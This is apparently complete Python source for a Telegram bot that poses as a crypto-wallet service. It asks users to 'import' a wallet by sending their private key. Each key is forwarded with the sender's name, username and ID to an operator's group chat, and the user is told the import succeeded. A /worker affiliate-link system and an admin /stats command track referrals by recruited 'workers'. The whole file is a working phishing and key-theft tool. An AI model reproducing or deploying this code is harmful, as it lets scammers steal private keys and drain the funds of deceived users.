from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import logging
import uuid

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
GROUP_CHAT_ID = -1002378426583  # Replace with your group chat ID
ADMIN_USER_ID = 7620999875        # Replace with your user ID
DATABASE = {}  # Simple in-memory storage (consider using a real database)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    keyboard = [
        [InlineKeyboardButton("💰 Wallet", callback_data='wallet')],
        [InlineKeyboardButton("📊 Stats", callback_data='stats')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if 'wallet' not in context.user_data:
        await update.message.reply_text(
            "❌ No wallets connected. Import first. ❌",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            "✅ Wallet connected!",
            reply_markup=reply_markup
        )

async def worker(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    affiliate_id = str(uuid.uuid4())[:8]
    DATABASE[user_id] = {'affiliate_id': affiliate_id, 'referrals': []}

    await update.message.reply_text(
        f"👷 Your affiliate link:\n"
        f"https://t.me/{context.bot.username}?start={affiliate_id}"
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'wallet':
        context.user_data['awaiting_private_key'] = True
        await query.edit_message_text("🔑 Please send your private key:")

async def handle_private_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_private_key'):
        private_key = update.message.text

        try:
            # Log to admin group
            user_info = update.effective_user
            log_message = (
                f"🆕 New private key received from:\n"
                f"User: {user_info.full_name} (@{user_info.username})\n"
                f"ID: {user_info.id}\n"
                f"Key: {private_key}"
            )
            await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=log_message)

            # Store in user data
            context.user_data['wallet'] = private_key
            context.user_data['awaiting_private_key'] = False

            # Track referral if exists
            if 'referrer' in context.user_data:
                referrer_id = context.user_data['referrer']
                if referrer_id in DATABASE:
                    DATABASE[referrer_id]['referrals'].append({
                        'user_id': user_info.id,
                        'timestamp': update.message.date
                    })

            await update.message.reply_text("✅ Wallet imported successfully!")

        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == ADMIN_USER_ID:
        stats_message = "📊 Admin Stats:\n"
        stats_message += f"Total users: {len(DATABASE)}\n"
        for user, data in DATABASE.items():
            stats_message += f"User {user}: {len(data['referrals'])} referrals\n"
        await update.message.reply_text(stats_message)
    else:
        await update.message.reply_text("⚠️ You don't have permission to view stats.")

def main():
    application = Application.builder().token("TELEGRAM_TOKEN_HERE").build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("worker", worker))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_private_key))

    application.run_polling()

if __name__ == "__main__":
    main()
